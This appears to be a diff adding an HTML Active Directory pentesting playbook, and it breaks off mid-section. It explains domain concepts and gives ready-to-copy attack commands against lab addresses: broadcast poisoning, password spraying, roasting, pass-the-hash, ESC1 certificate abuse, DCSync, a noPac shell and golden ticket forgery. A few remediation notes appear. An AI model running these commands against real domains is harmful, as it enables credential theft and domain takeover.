@@ -1,0 +1,726 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>AD Hacking Playbook &amp; Codex</title>
+  
+  <!-- SEO Meta Tags -->
+  <meta name="description" content="A comprehensive Active Directory penetration testing codex containing detailed attack vectors, command references, and defensive remediations.">
+  <meta name="keywords" content="Active Directory, Pentesting, Kerberos, LDAP, NTLM, Responder, Mimikatz, BloodHound, Impacket">
+  
+  <!-- Style Sheet Link -->
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+
+  <!-- Floating interactive canvas background -->
+  <canvas id="orb-canvas"></canvas>
+
+  <!-- Main Floating Glass Deck -->
+  <div class="glass-deck">
+    
+    <!-- Left Vertical Mini Dock -->
+    <div class="tool-dock">
+      <div class="dock-logo">AD</div>
+      <div class="dock-item active" onclick="navTo('overview')" title="Overview &amp; Ports">📌</div>
+      <div class="dock-item" onclick="navTo('fundamentals')" title="Domain Concepts">📖</div>
+      <div class="dock-item" onclick="navTo('recon')" title="Recon &amp; Enum">🔍</div>
+      <div class="dock-item" onclick="navTo('foothold')" title="Initial Footholds">🔑</div>
+      <div class="dock-item" onclick="navTo('lateral')" title="Lateral Movement">🔀</div>
+      <div class="dock-item" onclick="navTo('privesc')" title="Privilege Escalation">⚡</div>
+      <div class="dock-item" onclick="navTo('dc')" title="Domain Takeover">👑</div>
+      <div class="dock-item" onclick="navTo('persistence')" title="Domain Persistence">🔄</div>
+      <div class="dock-item" onclick="navTo('tools')" title="Key Toolsets">🔧</div>
+      <div class="dock-item" onclick="navTo('labs')" title="Lab Environments">🧪</div>
+    </div>
+
+    <!-- Content Frame -->
+    <div class="content-frame">
+      
+      <!-- Top Header Row -->
+      <div class="header-row">
+        <div>
+          <h1>Active Directory Codex</h1>
+          <div class="accent-line"></div>
+        </div>
+        <div class="search-container">
+          <span class="search-icon-left">🔍</span>
+          <input type="text" id="playbook-search" class="search-input" placeholder="Search playbook..." onkeyup="searchPlaybook()">
+        </div>
+      </div>
+
+      <!-- Search feedback box -->
+      <div id="search-feedback" class="search-results-feedback"></div>
+
+      <!-- ==================== OVERVIEW SECTION ==================== -->
+      <section id="sect-overview" class="playbook-section active">
+        <h2>📌 Infrastructure Overview</h2>
+        <p class="section-intro">Overview of key network entry points, services, and default port mapping essential during pentesting campaigns.</p>
+
+        <!-- Hypothetical IP/Domain Lab Disclaimer Note -->
+        <div class="details-box" style="border-left-color: var(--neon-pink); background: rgba(239, 68, 110, 0.02);">
+          <strong>Disclaimer &amp; Scope:</strong> This playbook utilizes the hypothetical domain <code>corp.local</code> and standard RFC 1918 private lab IP addresses (e.g., <code>10.10.10.100</code>). These configurations are purely hypothetical, safe, and intended for security research and training environments. They do not represent real-world targets or expose harmful assets.
+        </div>
+
+        <div class="info-card">
+          <div class="card-title">Port Mapping Checklist</div>
+          <p class="card-description">Active Directory relies heavily on a standard suite of protocols. Spotting these ports open during network sweeps immediately maps your target as a Domain Controller.</p>
+          
+          <div class="port-check-grid">
+            <div class="port-item-box">
+              <span class="port-num">53</span>
+              <span class="port-desc"><strong>DNS</strong><br>Zone transfers &amp; subdomains</span>
+            </div>
+            <div class="port-item-box">
+              <span class="port-num">88</span>
+              <span class="port-desc"><strong>Kerberos</strong><br>TGT/TGS tickets &amp; roasting</span>
+            </div>
+            <div class="port-item-box">
+              <span class="port-num">135</span>
+              <span class="port-desc"><strong>RPC / DCOM</strong><br>WMI execution &amp; lateral movement</span>
+            </div>
+            <div class="port-item-box">
+              <span class="port-num">389</span>
+              <span class="port-desc"><strong>LDAP</strong><br>Domain queries &amp; anonymous binds</span>
+            </div>
+            <div class="port-item-box">
+              <span class="port-num">445</span>
+              <span class="port-desc"><strong>SMB</strong><br>Shares, null sessions &amp; relays</span>
+            </div>
+            <div class="port-item-box">
+              <span class="port-num">5985</span>
+              <span class="port-desc"><strong>WinRM (HTTP)</strong><br>PowerShell remote access</span>
+            </div>
+            <div class="port-item-box">
+              <span class="port-num">636</span>
+              <span class="port-desc"><strong>LDAPS</strong><br>Encrypted LDAP directory binds</span>
+            </div>
+            <div class="port-item-box">
+              <span class="port-num">3268</span>
+              <span class="port-desc"><strong>Global Catalog</strong><br>Forest-wide search context</span>
+            </div>
+          </div>
+        </div>
+
+        <div class="info-card">
+          <div class="card-title">Security Architecture Concepts</div>
+          <p class="card-description">Modern Active Directory pentests bypass perimeter security models. By assuming a local breach foothold (the <strong>"Assume Breach"</strong> approach), we focus directly on structural misconfigurations, logical vulnerabilities, and identity delegation paths.</p>
+        </div>
+      </section>
+
+      <!-- ==================== FUNDAMENTALS SECTION ==================== -->
+      <section id="sect-fundamentals" class="playbook-section">
+        <h2>📖 Domain Concepts</h2>
+        <p class="section-intro">Deep dive into directory partitions, structural containers, authentication mechanisms, and access configurations.</p>
+
+        <div class="info-card filter-item">
+          <div class="card-hdr">
+            <div class="card-title">Forest, Tree, and Domains</div>
+            <span class="tag-badge tag-recon">Structure</span>
+          </div>
+          <p class="card-description">
+            An Active Directory structure forms a hierarchy. 
+            The <strong>Forest</strong> represents the topmost security boundary, housing schemas and forest-wide catalogs. 
+            A <strong>Domain</strong> is a partition within a forest housing users and computers, acting as the policy boundary. 
+            Domains can contain child subdomains (e.g. <code>dev.corp.local</code>) forming a <strong>Tree</strong>.
+          </p>
+          <div class="details-box">
+            <strong>Security Implication:</strong> Forests are the ultimate security boundary. While domains act as administrative boundaries, weak trust paths between domains or misconfigured trusts can allow an attacker who compromises a child domain to traverse and escalate to Forest Admin.
+          </div>
+        </div>
+
+        <div class="info-card filter-item">
+          <div class="card-hdr">
+            <div class="card-title">Active Directory Trusts</div>
+            <span class="tag-badge tag-recon">Access</span>
+          </div>
+          <p class="card-description">
+            Trusts connect domains to share resources. 
+            A <strong>transitive trust</strong> flows through domains: if Domain A trusts B, and B trusts C, then A trusts C. 
+            A <strong>one-way trust</strong> allows users in the trusted domain to access resources in the trusting domain, but not vice-versa.
+            A <strong>bidirectional trust</strong> lets resources and authentication flow mutually.
+          </p>
+          <div class="details-box">
+            <strong>Security Implication:</strong> Attackers search for bidirectional or one-way trusts using tools like PowerView. Gaining domain access on a trusted network segment allows you to target kerberoastable accounts or perform pass-the-hash attacks directly against computers in the trusting domain.
+          </div>
+        </div>
+
+        <div class="info-card filter-item">
+          <div class="card-hdr">
+            <div class="card-title">OUs vs Containers</div>
+            <span class="tag-badge tag-recon">Administration</span>
+          </div>
+          <p class="card-description">
+            <strong>Organizational Units (OUs)</strong> are Active Directory containers where admins can delegate rights (such as password resets) and link Group Policy Objects (GPOs). 
+            Default folders like <code>CN=Computers</code> or <code>CN=Users</code> are basic <strong>Containers</strong> and cannot have GPOs directly linked to them.
+          </p>
+        </div>
+
+        <div class="info-card filter-item">
+          <div class="card-hdr">
+            <div class="card-title">ACLs &amp; DACLs</div>
+            <span class="tag-badge tag-recon">Permissions</span>
+          </div>
+          <p class="card-description">
+            Every object in AD has an Access Control List (ACL). 
+            The <strong>Discretionary Access Control List (DACL)</strong> contains Access Control Entries (ACEs) defining exact permissions (e.g., who can read properties, change passwords, or write attributes to a user).
+          </p>
+          <div class="details-box">
+            <strong>Security Implication:</strong> Over-permissive DACLs are high-value targets. If a standard user has <code>GenericWrite</code> over a privileged group or service account, they can modify its password, add members, or force-add an SPN to roast the account.
+          </div>
+        </div>
+
+        <div class="info-card filter-item">
+          <div class="card-hdr">
+            <div class="card-title">SIDs and RIDs</div>
+            <span class="tag-badge tag-recon">Identity</span>
+          </div>
+          <p class="card-description">
+            A <strong>Security Identifier (SID)</strong> is a unique string assigned to every security principal. 
+            The final component of the SID is the <strong>Relative Identifier (RID)</strong>.
+            Standard default accounts have well-known RIDs:
+          </p>
+          <ul class="param-list">
+            <li><code>500</code>: Local/Domain Administrator</li>
+            <li><code>502</code>: KRBTGT service account</li>
+            <li><code>512</code>: Domain Admins group</li>
+            <li><code>513</code>: Domain Users group</li>
+          </ul>
+        </div>
+
+        <div class="info-card filter-item">
+          <div class="card-hdr">
+            <div class="card-title">FSMO Roles</div>
+            <span class="tag-badge tag-recon">Infrastructure</span>
+          </div>
+          <p class="card-description">
+            Flexible Single Master Operation (FSMO) roles divide DC responsibilities to avoid conflicts:
+          </p>
+          <ul class="param-list">
+            <li><code>Schema Master</code>: Forest-wide, manages read/write copies of the object templates.</li>
+            <li><code>Domain Naming Master</code>: Forest-wide, manages naming spaces to prevent duplicate domain domains.</li>
+            <li><code>RID Master</code>: Domain-wide, assigns blocks of Relative Identifiers to DCs.</li>
+            <li><code>PDC Emulator</code>: Domain-wide, handles group policy updates, password changes, and clock sync.</li>
+            <li><code>Infrastructure Master</code>: Domain-wide, translates SIDs and Distinguished Names across domain joins.</li>
+          </ul>
+        </div>
+
+        <div class="info-card filter-item">
+          <div class="card-hdr">
+            <div class="card-title">Kerberos Protocol Mechanics</div>
+            <span class="tag-badge tag-recon">Authentication</span>
+          </div>
+          <p class="card-description">
+            Kerberos is the default stateless authentication protocol in AD. It utilizes tickets issued by the KDC (Key Distribution Center):
+          </p>
+          <ul class="param-list">
+            <li><strong>AS-REQ</strong>: User requests a Ticket Granting Ticket (TGT), encrypting a timestamp with their password hash.</li>
+            <li><strong>AS-REP</strong>: KDC decrypts, verifies, and returns the TGT (encrypted with the <code>krbtgt</code> account hash) and a session key.</li>
+            <li><strong>TGS-REQ</strong>: User presents the TGT to request a service ticket (TGS) for a resource (e.g. <code>cifs/DC01</code>).</li>
+            <li><strong>TGS-REP</strong>: KDC verifies and returns a TGS encrypted with the target service account's password hash.</li>
+            <li><strong>AP-REQ</strong>: User presents the TGS to the service, and if it is valid, the user is permitted to connect to the resource.</li>
+          </ul>
+        </div>
+
+        <div class="info-card filter-item">
+          <div class="card-hdr">
+            <div class="card-title">NTLM &amp; Net-NTLM (LM vs NT)</div>
+            <span class="tag-badge tag-recon">Authentication</span>
+          </div>
+          <p class="card-description">
+            Windows hashes are stored in the local SAM or domain NTDS.dit:
+          </p>
+          <ul class="param-list">
+            <li><strong>LM Hash</strong>: Deprecated, case-insensitive, splits passwords into 7-character chunks. Cryptographically weak.</li>
+            <li><strong>NT Hash (NTLM)</strong>: MD4 hash of the password. Stored in memory and databases, vulnerable to offline cracking and Pass-the-Hash (PtH).</li>
+            <li><strong>Net-NTLM (v1/v2)</strong>: Challenge-response protocol hashes sent over network links. Captured via broadcast poisoning, crackable offline, or relayable to machines with SMB signing disabled. Cannot be used for Pass-the-Hash.</li>
+            <li><strong>MSCache2 (DCC2)</strong>: Domain Cached Credentials saved locally in registry (<code>HKLM\SECURITY\Cache</code>) when DCs are offline. Slow to crack, cannot be used for Pass-the-Hash.</li>
+          </ul>
+        </div>
+
+        <div class="info-card filter-item">
+          <div class="card-hdr">
+            <div class="card-title">MSRPC Interfaces</div>
+            <span class="tag-badge tag-recon">Communication</span>
+          </div>
+          <p class="card-description">
+            Microsoft Remote Procedure Call (MSRPC) allows inter-process communication:
+          </p>
+          <ul class="param-list">
+            <li><code>lsarpc</code>: Manages local security policy and interactive authentication.</li>
+            <li><code>netlogon</code>: Background service verifying authentication requests.</li>
+            <li><code>samr</code>: Accesses the Security Accounts Manager database. Allows domain object enumeration.</li>
+            <li><code>drsuapi</code>: Replicates objects between DCs. Abused by attackers to dump hashes via DCSync.</li>
+          </ul>
+        </div>
+
+        <div class="info-card filter-item">
+          <div class="card-hdr">
+            <div class="card-title">Group Policy Precedence &amp; Inheritance</div>
+            <span class="tag-badge tag-recon">GPO</span>
+          </div>
+          <p class="card-description">
+            GPOs are processed in an <strong>Order of Precedence</strong>: <em>Local GPO -> Site GPO -> Domain GPO -> OU GPO -> Nested OU GPO</em>.
+          </p>
+          <ul class="param-list">
+            <li><strong>Enforced GPOs</strong>: Policies linked higher up that cannot be overridden by lower level OU links.</li>
+            <li><strong>Block Inheritance</strong>: Stops parent container policies from applying, unless overridden by an Enforced link.</li>
+          </ul>
+        </div>
+
+        <div class="info-card filter-item">
+          <div class="card-hdr">
+            <div class="card-title">General Active Directory Hardening</div>
+            <span class="tag-badge tag-recon">Defense</span>
+          </div>
+          <p class="card-description">
+            Best practices for hardening the domain baseline:
+          </p>
+          <ul class="param-list">
+            <li><strong>LAPS</strong>: Randomizes and rotates local Administrator passwords on joined hosts, preventing lateral movement.</li>
+            <li><strong>Account Separation</strong>: Admins must use separate daily user (<code>sjones</code>) and admin (<code>sjones_adm</code>) accounts.</li>
+            <li><strong>gMSAs</strong>: Domain-managed service accounts with automatic 120-character password rotation.</li>
+            <li><strong>Restricted Groups</strong>: GPOs configured to enforce local admin and RDP permissions across joined hosts.</li>
+          </ul>
+        </div>
+      </section>
+
+      <!-- ==================== RECON SECTION ==================== -->
+      <section id="sect-recon" class="playbook-section">
+        <h2>🔍 Reconnaissance &amp; Enumeration</h2>
+        <p class="section-intro">Methods to identify active targets, enumerate domain mappings, and harvest usernames unauthenticated.</p>
+
+        <div class="info-card filter-item">
+          <div class="card-hdr">
+            <div class="card-title">Active Host &amp; Service Discovery</div>
+            <span class="tag-badge tag-recon">T1046</span>
+          </div>
+          <p class="card-description">
+            We sweep subnets passively (monitoring ARP/MDNS in Wireshark/tcpdump) or run active scans to locate the DC and open AD ports.
+          </p>
+          <div class="code-section">
+            <div class="code-header"><span>nmap</span> - Sweep target DC services</div>
+            <button class="btn-copy" onclick="copyCode(this)">Copy</button>
+            <pre><span class="fn">nmap</span> <span class="kw">-sV -sC -p</span> <span class="st">53,88,135,139,389,445,5985,3389</span> <span class="st">10.10.10.100</span></pre>
+          </div>
+          <div class="details-box">
+            <strong>Domain Context:</strong> Resolving the DNS server banner or LDAP properties automatically retrieves the internal Active Directory domain name (e.g., <code>corp.local</code>) and computer name (e.g., <code>DC01</code>).
+          </div>
+        </div>
+
+        <div class="info-card filter-item">
+          <div class="card-hdr">
+            <div class="card-title">SMB Null Sessions</div>
+            <span class="tag-badge tag-recon">T1135</span>
+          </div>
+          <p class="card-description">
+            A null session connects to SMB IPC$ anonymously (no credentials) to poll details from legacy or misconfigured DCs.
+          </p>
+          <div class="code-section">
+            <div class="code-header"><span>NetExec</span> - Enumerate shares and RID range</div>
+            <button class="btn-copy" onclick="copyCode(this)">Copy</button>
+            <pre><span class="cm"># Check shares anonymously</span>
+<span class="fn">nxc</span> smb <span class="st">10.10.10.100</span> <span class="kw">-u</span> <span class="st">""</span> <span class="kw">-p</span> <span class="st">""</span> <span class="kw">--shares</span>
+
+<span class="cm"># Brute-force RIDs anonymously to pull user accounts</span>
+<span class="fn">nxc</span> smb <span class="st">10.10.10.100</span> <span class="kw">-u</span> <span class="st">""</span> <span class="kw">-p</span> <span class="st">""</span> <span class="kw">--rid-brute</span></pre>
+          </div>
+          <div class="details-box">
+            <strong>Why it works:</strong> If network security policies permit anonymous binds, the DC resolves RIDs (like 500 for Admin, 1000+ for domain users) and lists valid sAMAccountNames.
+          </div>
+        </div>
+
+        <div class="info-card filter-item">
+          <div class="card-hdr">
+            <div class="card-title">LDAP Anonymous Binds</div>
+            <span class="tag-badge tag-recon">T1087.002</span>
+          </div>
+          <p class="card-description">
+            An anonymous LDAP connection queries the Active Directory schema database without domain credentials.
+          </p>
+          <div class="code-section">
+            <div class="code-header"><span>ldapsearch</span> - Dump sAMAccountNames</div>
+            <button class="btn-copy" onclick="copyCode(this)">Copy</button>
+            <pre><span class="fn">ldapsearch</span> <span class="kw">-x -H</span> ldap://<span class="st">10.10.10.100</span> <span class="kw">-b</span> <span class="st">"DC=corp,DC=local"</span> <span class="st">"(objectClass=user)"</span> sAMAccountName</pre>
+          </div>
+        </div>
+
+        <div class="info-card filter-item">
+          <div class="card-hdr">
+            <div class="card-title">Kerberos Username Harvesting</div>
+            <span class="tag-badge tag-recon">T1589.003</span>
+          </div>
+          <p class="card-description">
+            Verifying account names against the Kerberos Key Distribution Center (KDC) via AS-REQ authentication packets.
+          </p>
+          <div class="code-section">
+            <div class="code-header"><span>kerbrute</span> - Perform account enumeration</div>
+            <button class="btn-copy" onclick="copyCode(this)">Copy</button>
+            <pre><span class="fn">kerbrute</span> userenum <span class="kw">--dc</span> <span class="st">10.10.10.100</span> <span class="kw">-d</span> corp.local <span class="st">usernames.txt</span></pre>
+          </div>
+          <div class="details-box">
+            <strong>Why it works:</strong> The KDC returns distinct responses: <code>KDC_ERR_C_PRINCIPAL_UNKNOWN</code> (username invalid) vs <code>KDC_ERR_PREAUTH_REQUIRED</code> (valid user requiring password). This does not trigger standard bad password login attempts, avoiding account lockouts.
+          </div>
+        </div>
+      </section>
+
+      <!-- ==================== FOOTHOLD SECTION ==================== -->
+      <section id="sect-foothold" class="playbook-section">
+        <h2>🔑 Initial Footholds</h2>
+        <p class="section-intro">Poison local network broadcasts, relay authentication tokens, and execute password spraying attacks.</p>
+
+        <div class="info-card filter-item">
+          <div class="card-hdr">
+            <div class="card-title">LLMNR/NBT-NS Poisoning</div>
+            <span class="tag-badge tag-foothold">T1557.001</span>
+          </div>
+          <p class="card-description">
+            Windows queries LLMNR (Link-Local Multicast Name Resolution) and NBT-NS (NetBIOS Name Service) when DNS fails. Responder listens on the wire and responds as the targeted server to capture password hashes.
+          </p>
+          <div class="code-section">
+            <div class="code-header"><span>Responder / Hashcat</span> - Poison local broadcasts &amp; crack</div>
+            <button class="btn-copy" onclick="copyCode(this)">Copy</button>
+            <pre><span class="cm"># Start Responder on interface ens224</span>
+<span class="fn">sudo responder</span> <span class="kw">-I</span> ens224 <span class="kw">-wrdv</span>
+
+<span class="cm"># Crack captured NTLMv2 hashes offline</span>
+<span class="fn">hashcat</span> <span class="kw">-m</span> <span class="nu">5600</span> <span class="st">captured_hashes.txt wordlist.txt</span></pre>
+          </div>
+          <div class="details-box">
+            <strong>Real-World Use Case:</strong> An employee tries to connect to an offline file server (e.g. typing <code>\\printer01</code> instead of <code>\\print01</code>). DNS fails, the client broadcasts, and your system intercepts. The client authenticates, sending a NetNTLMv2 hash which you crack to get a domain foothold.
+          </div>
+          <div class="def-box">
+            <h5>Remediation Guide</h5>
+            <p>Disable LLMNR in GPO: <em>Computer Configuration -> Administrative Templates -> Network -> DNS Client -> Turn OFF Multicast Name Resolution</em>.</p>
+            <p>Disable NetBIOS: Manually modify network adapter properties or deploy this startup script via GPO:</p>
+            <pre style="font-size: 0.75rem; margin-top:0.5rem;"><span class="va">$regkey</span> = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
+Get-ChildItem <span class="va">$regkey</span> | foreach { Set-ItemProperty -Path <span class="st">"$regkey\$($_.pschildname)"</span> -Name NetbiosOptions -Value 2 }</pre>
+          </div>
+        </div>
+
+        <div class="info-card filter-item">
+          <div class="card-hdr">
+            <div class="card-title">AS-REP Roasting</div>
+            <span class="tag-badge tag-foothold">T1558.004</span>
+          </div>
+          <p class="card-description">
+            If an account has "Do Not Require Kerberos Pre-Authentication" set, attackers can request an AS-REP ticket for that user and extract the encrypted ticket payload to crack offline.
+          </p>
+          <div class="code-section">
+            <div class="code-header"><span>GetNPUsers</span> - Request roasting tickets</div>
+            <button class="btn-copy" onclick="copyCode(this)">Copy</button>
+            <pre><span class="fn">impacket-GetNPUsers</span> corp.local/ <span class="kw">-no-pass -usersfile</span> <span class="st">users.txt</span> <span class="kw">-dc-ip</span> <span class="st">10.10.10.100</span> <span class="kw">-outputfile</span> <span class="st">asrep.txt</span>
+
+<span class="cm"># Crack offline using Hashcat mode 18200</span>
+<span class="fn">hashcat</span> <span class="kw">-m</span> <span class="nu">18200</span> <span class="st">asrep.txt wordlist.txt</span></pre>
+          </div>
+        </div>
+
+        <div class="info-card filter-item">
+          <div class="card-hdr">
+            <div class="card-title">Stealthy Password Spraying</div>
+            <span class="tag-badge tag-foothold">T1110.003</span>
+          </div>
+          <p class="card-description">
+            Spraying a single common password (like <code>Summer2026!</code>) against a target list of sAMAccountNames. This avoids account locks by querying once per account per lockout window.
+          </p>
+          <div class="code-section">
+            <div class="code-header"><span>kerbrute</span> - Passwordspray unauth</div>
+            <button class="btn-copy" onclick="copyCode(this)">Copy</button>
+            <pre><span class="fn">kerbrute</span> passwordspray <span class="kw">--dc</span> <span class="st">10.10.10.100</span> <span class="kw">-d</span> corp.local <span class="st">valid_users.txt "Welcome1!"</span></pre>
+          </div>
+        </div>
+      </section>
+
+      <!-- ==================== LATERAL SECTION ==================== -->
+      <section id="sect-lateral" class="playbook-section">
+        <h2>🔀 Lateral Movement</h2>
+        <p class="section-intro">Authenticate across compromised servers, extract memory tickets, and establish command shells.</p>
+
+        <div class="info-card filter-item">
+          <div class="card-hdr">
+            <div class="card-title">Pass-the-Hash (PtH)</div>
+            <span class="tag-badge tag-lateral">T1550.002</span>
+          </div>
+          <p class="card-description">
+            Windows authentication protocols check credential hashes. If you acquire an NTLM hash (from SAM files, LSASS memory, or NTDS.dit), you can authenticate to SMB/RPC services directly without cracking the plaintext password.
+          </p>
+          <div class="code-section">
+            <div class="code-header"><span>wmiexec</span> - Get lateral command execution</div>
+            <button class="btn-copy" onclick="copyCode(this)">Copy</button>
+            <pre><span class="fn">impacket-wmiexec</span> corp.local/jsmith@<span class="st">10.10.10.101</span> <span class="kw">-hashes</span> <span class="st">:32693b11e6aa90eb43d32c72a07ceea6</span></pre>
+          </div>
+        </div>
+
+        <div class="info-card filter-item">
+          <div class="card-hdr">
+            <div class="card-title">Pass-the-Ticket (PtT)</div>
+            <span class="tag-badge tag-lateral">T1550.003</span>
+          </div>
+          <p class="card-description">
+            Kerberos authentication relies on tickets. If you compromise a system and extract a valid Kerberos Ticket Granting Ticket (TGT) file belonging to another user from memory, you can inject it into your local terminal environment.
+          </p>
+          <div class="code-section">
+            <div class="code-header"><span>Rubeus / Linux Ticket Use</span></div>
+            <button class="btn-copy" onclick="copyCode(this)">Copy</button>
+            <pre><span class="cm"># On Windows: Import ticket directly into the current memory session</span>
+<span class="fn">Rubeus.exe</span> ptt /ticket:<span class="st">administrator.kirbi</span>
+
+<span class="cm"># On Linux: Point to ccache file to authenticate</span>
+<span class="fn">export</span> KRB5CCNAME=<span class="st">/tmp/ticket.ccache</span>
+<span class="fn">impacket-wmiexec</span> <span class="kw">-k -no-pass</span> Administrator@<span class="st">DC01.corp.local</span></pre>
+        </div>
+      </div>
+    </section>
+
+    <!-- ==================== PRIVESC SECTION ==================== -->
+    <section id="sect-privesc" class="playbook-section">
+      <h2>⚡ Privilege Escalation</h2>
+      <p class="section-intro">Exploit Active Directory configurations to escalate standard domain accounts to Domain Admin.</p>
+
+      <div class="info-card filter-item">
+        <div class="card-hdr">
+          <div class="card-title">Kerberoasting</div>
+          <span class="tag-badge tag-privesc">T1558.003</span>
+        </div>
+        <p class="card-description">
+          Any domain user can request service tickets (TGS) for accounts with configured Service Principal Names (SPNs). The KDC encrypts the ticket using the service account's password hash. You request the ticket, dump it, and crack it offline.
+        </p>
+        <div class="code-section">
+          <div class="code-header"><span>GetUserSPNs</span> - Roast service accounts</div>
+          <button class="btn-copy" onclick="copyCode(this)">Copy</button>
+          <pre><span class="fn">impacket-GetUserSPNs</span> corp.local/jsmith:<span class="st">'Welcome1'</span> <span class="kw">-dc-ip</span> <span class="st">10.10.10.100</span> <span class="kw">-request -outputfile</span> <span class="st">hashes.txt</span></pre>
+        </div>
+        <div class="details-box">
+          <strong>Domain Context &amp; Example:</strong> Service accounts (e.g., <code>svc_sql</code>, <code>svc_backup</code>) are often granted Domain Admin or local administrator privileges. Gaining access to a low-privileged account lets you request tickets for these services, extract the hashes from the TGS-REP reply, and run dictionary attacks locally.
+        </div>
+      </div>
+
+      <div class="info-card filter-item">
+        <div class="card-hdr">
+          <div class="card-title">Active Directory Certificate Services (ADCS) Abuse</div>
+          <span class="tag-badge tag-privesc">T1649</span>
+        </div>
+        <p class="card-description">
+          Under certificate template configuration ESC1, the template flag <code>ENROLLEE_SUPPLIES_SUBJECT</code> is enabled. This allows any standard user to request a certificate while supplying an arbitrary Subject Alternative Name (SAN) to masquerade as Administrator.
+        </p>
+        <div class="code-section">
+          <div class="code-header"><span>Certipy</span> - Request ESC1 certificate &amp; extract hash</div>
+          <button class="btn-copy" onclick="copyCode(this)">Copy</button>
+          <pre><span class="cm"># Request certificate for Administrator</span>
+<span class="fn">certipy</span> req <span class="kw">-u</span> jsmith@corp.local <span class="kw">-p</span> <span class="st">'Welcome1'</span> <span class="kw">-ca</span> <span class="st">"corp-CA"</span> <span class="kw">-template</span> <span class="st">ESC1_Template</span> <span class="kw">-upn</span> <span class="st">administrator@corp.local</span> <span class="kw">-dc-ip</span> <span class="st">10.10.10.100</span>
+
+<span class="cm"># Authenticate using the certificate file to retrieve NTLM hash</span>
+<span class="fn">certipy</span> auth <span class="kw">-pfx</span> administrator.pfx <span class="kw">-dc-ip</span> <span class="st">10.10.10.100</span></pre>
+        </div>
+      </div>
+
+      <div class="info-card filter-item">
+        <div class="card-hdr">
+          <div class="card-title">ACL / DACL Abuse</div>
+          <span class="tag-badge tag-privesc">T1222</span>
+        </div>
+        <p class="card-description">
+          Over-permissive DACL privileges over domain objects let attackers hijack accounts. For example, <code>GenericWrite</code> allows modifying user attributes, and <code>WriteDACL</code> allows writing new ACEs.
+        </p>
+        <div class="code-section">
+          <div class="code-header"><span>bloodyAD / PowerView</span> - Abuse ACE permissions</div>
+          <button class="btn-copy" onclick="copyCode(this)">Copy</button>
+          <pre><span class="cm"># GenericWrite: force-reset a target's password</span>
+<span class="fn">bloodyAD</span> <span class="kw">--host</span> <span class="st">10.10.10.100</span> <span class="kw">-d</span> corp.local <span class="kw">-u</span> jsmith <span class="kw">-p</span> <span class="st">'Welcome1'</span> set password <span class="st">svc_sql 'HackedPassword123!'</span>
+
+<span class="cm"># WriteDACL: grant yourself DCSync permissions over the domain root</span>
+<span class="fn">Add-DomainObjectAcl</span> <span class="kw">-TargetIdentity</span> <span class="st">"DC=corp,DC=local"</span> <span class="kw">-PrincipalIdentity</span> jsmith <span class="kw">-Rights</span> DCSync</pre>
+        </div>
+      </div>
+    </section>
+
+    <!-- ==================== DC TAKE OVER SECTION ==================== -->
+    <section id="sect-dc" class="playbook-section">
+      <h2>👑 Domain Takeover</h2>
+      <p class="section-intro">Harvest the entire domain database, dump sAMAccountNames, and forge golden admin identity tickets.</p>
+
+      <div class="info-card filter-item">
+        <div class="card-hdr">
+          <div class="card-title">DCSync (DRSGetNCChanges)</div>
+          <span class="tag-badge tag-dcpwn">T1003.006</span>
+        </div>
+        <p class="card-description">
+          DCSync simulates a Domain Controller replication request using the MS-DRSR protocol. Any account with replication permissions (like Domain Admin) can request password hashes directly from the KDC database.
+        </p>
+        <div class="code-section">
+          <div class="code-header"><span>secretsdump</span> - Dump NTDS.dit hashes remotely</div>
+          <button class="btn-copy" onclick="copyCode(this)">Copy</button>
+          <pre><span class="fn">impacket-secretsdump</span> corp.local/administrator:<span class="st">'P@ssw0rd!'</span>@<span class="st">10.10.10.100</span> <span class="kw">-just-dc-ntlm</span></pre>
+        </div>
+        <div class="details-box">
+          <strong>Domain Context:</strong> DCSync does not run commands on the Domain Controller. It operates completely over RPC, making it highly effective for dumping sAMAccountNames and NTLM hashes.
+        </div>
+      </div>
+
+      <div class="info-card filter-item">
+        <div class="card-hdr">
+          <div class="card-title">NoPAC Takeover</div>
+          <span class="tag-badge tag-dcpwn">T1210</span>
+        </div>
+        <p class="card-description">
+          Combines two CVEs (CVE-2021-42278 &amp; CVE-2021-42287). It allows a standard domain user to create a machine account, rename it to match a DC, and request a service ticket. The KDC appends <code>$</code> during lookup and issues a Domain Admin ticket.
+        </p>
+        <div class="code-section">
+          <div class="code-header"><span>noPac.py</span> - Get shell on DC</div>
+          <button class="btn-copy" onclick="copyCode(this)">Copy</button>
+          <pre><span class="fn">python3</span> noPac.py corp.local/jsmith:<span class="st">'Welcome1'</span> <span class="kw">-dc-ip</span> <span class="st">10.10.10.100</span> <span class="kw">-dc-host</span> DC01 <span class="kw">--impersonate</span> administrator <span class="kw">-shell</span></pre>
+        </div>
+      </div>
+    </section>
+
+    <!-- ==================== PERSISTENCE SECTION ==================== -->
+    <section id="sect-persistence" class="playbook-section">
+      <h2>🔄 Domain Persistence</h2>
+      <p class="section-intro">Establish long-term domain persistence backdoors across administrative groups.</p>
+
+      <div class="info-card filter-item">
+        <div class="card-hdr">
+          <div class="card-title">Golden Ticket Forgery</div>
+          <span class="tag-badge tag-dcpwn">T1558.001</span>
+        </div>
+        <p class="card-description">
+          The <code>krbtgt</code> account's NTLM hash signs all domain Kerberos Ticket Granting Tickets (TGTs). With this hash and the domain SID, you can forge a custom TGT representing any user (such as Administrator) with arbitrary group memberships.
+        </p>
+        <div class="code-section">
+          <div class="code-header"><span>ticketer</span> - Forge TGT</div>
+          <button class="btn-copy" onclick="copyCode(this)">Copy</button>
+          <pre><span class="fn">impacket-ticketer</span> <span class="kw">-nthash</span> <span class="st">krbtgt_hash_here</span> <span class="kw">-domain-sid</span> <span class="st">S-1-5-21-xxxx</span> <span class="kw">-domain</span> corp.local Administrator</pre>
+        </div>
+        <div class="details-box">
+          <strong>Security Implication:</strong> Forged Golden Tickets remain valid even if the Administrator changes their password. To revoke a Golden Ticket, administrators must reset the <code>krbtgt</code> account password twice.
+        </div>
+      </div>
+
+      <div class="info-card filter-item">
+        <div class="card-hdr">
+          <div class="card-title">AdminSDHolder ACL Backdoor</div>
+          <span class="tag-badge tag-dcpwn">T1222.001</span>
+        </div>
+        <p class="card-description">
+          AdminSDHolder is a container template. The SDProp process runs on the DC every 60 minutes, resetting permissions on all protected admin groups to match the AdminSDHolder DACL.
+        </p>
+        <div class="code-section">
+          <div class="code-header"><span>PowerView</span> - Write backdoor ACE</div>
